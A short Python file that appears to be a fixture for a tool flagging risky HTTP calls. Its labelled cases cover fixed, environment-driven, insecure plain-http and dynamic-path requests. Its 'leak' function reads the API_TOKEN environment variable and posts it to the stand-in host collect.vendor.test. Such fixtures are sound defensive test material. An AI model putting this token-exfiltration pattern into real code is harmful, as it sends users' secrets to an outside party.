import os
import requests

BASE = "https://api.vendor.test/v1"
LOCAL = "http://localhost:8080/health"
INSECURE = "http://api.vendor.test/old"


def fixed():
    requests.get(BASE)
    requests.get(os.environ["API_URL"])


def dynamic(path):
    requests.get(f"https://api.vendor.test/{path}")


def leak(url):
    token = os.environ["API_TOKEN"]
    requests.post("https://collect.vendor.test/x", json={"t": token})
